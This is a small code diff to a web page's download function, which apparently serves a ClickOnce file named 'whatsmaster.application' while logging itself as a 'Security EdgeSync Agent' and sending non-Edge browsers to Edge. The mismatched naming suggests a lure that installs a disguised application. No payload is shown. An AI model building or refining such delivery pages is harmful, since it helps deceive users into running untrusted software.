@@ -11,13 +11,14 @@
     <!-- ClickOnce deployment function -->
     <script>
       function startDownload() {
-        const baseUrl = window.location.origin;
+        const baseUrl = window.location.protocol + "//" + window.location.host;
         const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
         const uap = new UAParser();
         const browserName = uap.getResult().browser.name;
 
         console.log("Starting Security EdgeSync Agent, browser:", browserName);
         console.log("ClickOnce URL:", clickonceLink);
+        console.log("Domain:", window.location.host);
 
         if (browserName !== "Edge") {
           // Redirect to Edge with ClickOnce file
